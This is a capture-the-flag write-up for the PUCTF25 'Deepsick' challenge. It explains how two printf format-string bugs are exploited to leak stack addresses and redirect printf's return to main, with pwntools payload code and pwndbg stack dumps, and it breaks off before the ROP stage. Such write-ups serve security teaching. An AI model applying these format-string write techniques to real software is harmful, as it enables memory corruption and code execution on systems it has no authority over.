# Deepsick
```
It started with a fever. One by one, NuttyShell fell to the strange **NuttyFlu**. But this wasn’t just any virus. All traces led back to a forgotten system buried deep in the network: **DeepSick Protocol**. Corrupt, unstable, and pulsing with unknown intent.
```
`Author: ivan`
`Flag Format: PUCTF25{[a-zA-Z0-9_]+_[a-fA-F0-9]{1,32}}`

## Decompiled source code
```c
void main(EVP_PKEY_CTX *param_1)

{
  long in_FS_OFFSET;
  char local_15 [5];
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  init(param_1);
  menu();
  enable_sandbox();
  puts("give you one chance!!!");
  read(0,local_15,5);
  printf(local_15);
  puts("begin your challenge");
  read(0,buf,0x50);
  printf(buf);
                    /* WARNING: Subroutine does not return */
  _exit(0);
}
```
From the above decompiled source code. We can spot format string vulnerabilities:
```
  read(0,local_15,5);
  printf(local_15);
```
and 
```
  read(0,buf,0x50);
  printf(buf);
```

## Attack plans
For the first `printf`:
```
  read(0,local_15,5);
  printf(local_15);
```
It only reads in 5 bytes which is totally not sufficient for a format string payload like `%c%10$hhn` that writes to memory address. Intead, it is sufficient for leaking a memory address. For example, `%p-%p`, `%10$p`, etc.


Therefore, we are using it to leak memory address. But what type of memory address are we leaking, address from which memory region? The answer is that we need to leak addresses from:


1. Stack 
2. .data section e.g. `0x55dc9d509000`
3. a libc address leak

Because:
- We will be doing ROP chain, that requires a libc leak so we get the huge amount of gadgets from libc. ~~still no `syscall ; ret`, so sad~~

- We need to somehow change `rsp` to point to our ROP chain which is likely located at the .data section i.e. `buf` in the decompiled source code.

- Since we need to change `rsp`, usually it's done by first changing `rbp` to desired location and `rip` to `leave ; ret` gadget. Therefore, we also need stack lack to be able to set the stack location of `rbp` and `rip`.

### How to leak 3 addresses
So, the problem is that we only have one chance of leaking an address and one chance for a `%n` payload. How can we leak 3 addresses while being able to write? The trick is to first make the program return back to start of `main`, or in the middle of `main` that calls `printf` again.


Therefore, our very first address leak would have to a stack leak since we are changing `rip` the return address of `printf` which is placed on the stack


### Leaking the first address
Using `pwndbg` to take a look at the stack when the very first `printf` was called (by doing `b * printf` to set a breakpoint at `printf`), we can see:
```replace with image
00:0000│ rsp         0x7ffd007b53f8 —▸ 0x5629cd97e47e (main+115) ◂— lea rdi, [rip + 0xc48]
01:0008│-020         0x7ffd007b5400 —▸ 0x7ffd007b5518 —▸ 0x7ffd007b71c5 ◂— './attachment_patched'
```
we can see that the there is a stack address `0x7ffd007b5518` on the stack which we can leak with `%p`. And since it was at the top of the stack before `printf` was called (before that `rip` to `main+115` being placed on top of stack). Then, it should be the 6th argument. Since the first 0 - 5 arguments are `rdi`, `rsi`, `rdx`, `rcx`, `r8` and `r9`. 


Therefore, a `%6$p` would be able to leak that address.


And I am using the same logic or strategy to find position of arguments for the rest of the exploit, i.e. when you see something like:
```
pos = int(0x138 / 8 + 6)
```
which `0x138` is the difference between two stack addresses, and since stack addresses are normally nicely 8-bytes aligned. So, we divide it by 8 and then plus 6 (the first 6 arguments)

Therefore, a `%6$p` would be able to leak that address.

Here's the exact part of the python solve script responsible to leak the very first address:
```py
payload = b"%6$p" # can only leak one address

p.recvuntil(b"give you one chance!!!\n")

gdb.attach(p, s)
p.sendline(payload)

leak = p.recvline().strip().decode()
leak = int(leak, 16)
rip_pos = leak - 0x120

print("Rip position: ", hex(rip_pos))
```
### How to return to main
Here is a snapshot of the stack right before the second `printf`:
```replace with pic
───────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────
 ► 0x7fc20fd73c90 <printf>       endbr64 
   0x7fc20fd73c94 <printf+4>     sub    rsp, 0xd8                       RSP => 0x7ffd007b5320 (0x7ffd007b53f8 - 0xd8)
   0x7fc20fd73c9b <printf+11>    mov    r10, rdi                        R10 => 0x5629cd981060 (buf) ◂— '%21492c%c%c%c%c%hn%24c%41$hhn\n'
   0x7fc20fd73c9e <printf+14>    mov    qword ptr [rsp + 0x28], rsi     [0x7ffd007b5348] <= 0x5629cd981060 (buf) ◂— '%21492c%c%c%c%c%hn%24c%41$hhn\n'
   0x7fc20fd73ca3 <printf+19>    mov    qword ptr [rsp + 0x30], rdx     [0x7ffd007b5350] <= 0x50
   0x7fc20fd73ca8 <printf+24>    mov    qword ptr [rsp + 0x38], rcx     [0x7ffd007b5358] <= 0x7fc20fe201f2 (read+18) ◂— cmp rax, -0x1000 /* 'H=' */                                                                                   
   0x7fc20fd73cad <printf+29>    mov    qword ptr [rsp + 0x40], r8      [0x7ffd007b5360] <= 0x15
   0x7fc20fd73cb2 <printf+34>    mov    qword ptr [rsp + 0x48], r9      [0x7ffd007b5368] <= 0xf
   0x7fc20fd73cb7 <printf+39>    test   al, al                          0 & 0     EFLAGS => 0x246 [ cf PF af ZF sf IF df of ]                                                                                                         
   0x7fc20fd73cb9 <printf+41>  ✔ je     printf+98                   <printf+98>
    ↓
   0x7fc20fd73cf2 <printf+98>    mov    rax, qword ptr fs:[0x28]        RAX, [0x7fc20fd0f768] => 0xe1c2ed5f5937d700
─────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────
00:0000│ rsp 0x7ffd007b53f8 —▸ 0x5629cd97e4b1 (main+166) ◂— mov edi, 0
01:0008│-020 0x7ffd007b5400 —▸ 0x7ffd007b5518 —▸ 0x7ffd007b71c5 ◂— './attachment_patched'
02:0010│-018 0x7ffd007b5408 ◂— 0x1cd97e1a0
03:0018│-010 0x7ffd007b5410 ◂— 0xa702436257b5510
04:0020│-008 0x7ffd007b5418 ◂— 0xe1c2ed5f5937d700
05:0028│ rbp 0x7ffd007b5420 ◂— 0
06:0030│+008 0x7ffd007b5428 —▸ 0x7fc20fd36083 (__libc_start_main+243) ◂— mov edi, eax
07:0038│+010 0x7ffd007b5430 —▸ 0x7fc20ff72620 (_rtld_global_ro) ◂— 0x60c0d00000000
───────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────
```
In order to return back to main, we need to make changes on `rsp 0x7ffd007b53f8 —▸ 0x5629cd97e4b1 (main+166) ◂— mov edi, 0`. More specifically, we need to change the `rip` from being `0x5629cd97e4b1 (main+166)` which would proceed to `exit()` to being something like `0x5629cd97e410 (main+5)` or `0x5629cd97e47e (main+115)` which is before the `read` and `printf` function calls so that we can input format string payload again.


But there is a big problem, which is that our format string payload is not on the stack. So we cannot simply place a stack address (`rsp`) and modify its content with `%n`s.

First, what we need to do is to change an existing stack address currently stored on the stack, which is at the same time also pointing to another stack address. We then need to change the stack address it points to, to become the `rsp`. For example:
`0x7fff955c4048` is now pointing to `0x7fff955c61c5 ◂— './attachment_patched'`
```
00:0000│ rsp 0x7fff955c3f28 —▸ 0x558ad449b4b1 (main+166) ◂— mov edi, 0
01:0008│-020 0x7fff955c3f30 —▸ 0x7fff955c4048 —▸ 0x7fff955c61c5 ◂— './attachment_patched'
```
We need to modify it via `0x7fff955c4048` which is also a stack address, to become:
```
00:0000│ rsp 0x7fff955c3f28 —▸ 0x558ad449b4b1 (main+166) ◂— mov edi, 0
01:0008│-020 0x7fff955c3f30 —▸ 0x7fff955c4048 —▸ 0x7fff955c3f28 —▸ 0x558ad449b4b1 (main+166) ◂— mov edi, 0
```

Then, we would have `0x7fff955c3f28` (`rsp`), being pointed to by an address on the stack at higher memory position, which is also an `printf` argument. So, then we would be able to modify `0x558ad449b4b1` (`rip`) via `0x7fff955c3f28` (`rsp`) which is now stored on the stack.


To achieve the above, we just need to use `%hn` to overwrite the first 4 bytes (in little endian) of `0x7fff955c4048` to `\x28\x3f` i.e. the first two address btyes of `0x7fff955c3f28` (`rsp`) presented in little endian, which changes at different program runs due to PIE and ASLR. 


### Format string payload in depth
Therefore, this particular part of the payload looks like this:
```py
# exact the last (first) two bytes
bytes_to_write = rip_pos & 0xffff 

# write it with no $
payload = f"%{bytes_to_write-4}c%c%c%c%c%hn".encode()
```

Here we cannot write with a `$` because we later need to change the `rip` via the `rsp` that we modified to be stored on stack within the same `printf`. And if `$` is used, an internal buffer will be used to store the original positional arguments i.e. the original stack address `—▸ 0x7fff955c61c5 ◂— './attachment_patched'` before overwritten to `—▸ 0x7fff955c3f28 —▸ 0x558ad449b4b1 (main+166)` (`rsp`). Then in that case, our second `%n` wouldn't overwrite `0x7fff955c3f28` but overwriting `0x7fff955c61c5` that is stored in the internal buffer if `$` was used to specify the positional argument.

After we have `rsp` placed on the stack without using `$` for the overwrite, we can then modify `rip` via it. Here is how I do it:
```py
bytes_to_write = rip_pos & 0xffff
payload = f"%{bytes_to_write-4}c%c%c%c%c%hn".encode()
written = bytes_to_write
bytes_to_write = padding(written, 0x10, 0x100) # max being 0x100 for hhn
pos = int(0x118 / 8 + 6)
payload += f"%{bytes_to_write}c%{pos}$hhn".encode()
```

Here `written` records the bytes that has already been written with `%c` in preivous part of the payload, and `padding(written, 0x10, 0x100)` is a function that wraps around the bytes to write if `written` has already exceeded the number of characters that the desired byte to write requires.
#### padding
```py
def padding(written, bytes_to_write, maximum):
	if written % maximum < bytes_to_write:
		return bytes_to_write - (written % maximum)
	else:
		return maximum - (written % maximum) + bytes_to_write
```
So, this:
```py
bytes_to_write = padding(written, 0x10, 0x100) # max being 0x100 for hhn
pos = int(0x118 / 8 + 6)
payload += f"%{bytes_to_write}c%{pos}$hhn".encode()
```

Simply writes the byte `0x10` to the address specified by `pos`.
And partial overwriting the first byte of `rsp` to `0x10`, making the `rip` ends with `0x10` would then make it `main + 5`. Therefore, printf would return to `main+5` and we can then make more format string payloads.


And by doing this:
```py
payload = b"%6$p" # can only leak one address

p.recvuntil(b"give you one chance!!!\n")
p.sendline(payload)

leak = p.recvline().strip().decode()
leak = int(leak, 16)
rip_pos = leak - 0x120
print("Rip position: ", hex(rip_pos))
# partial overwriting the first byte of return address of `printf` to 0x10, changing it to return to main+5
bytes_to_write = rip_pos & 0xffff
payload = f"%{bytes_to_write-4}c%c%c%c%c%hn".encode()
written = bytes_to_write
bytes_to_write = padding(written, 0x10, 0x100) # max being 0x100 for hhn
pos = int(0x118 / 8 + 6)
payload += f"%{bytes_to_write}c%{pos}$hhn".encode()
```
3 times, we would be able to leak 3 addresses.

### 
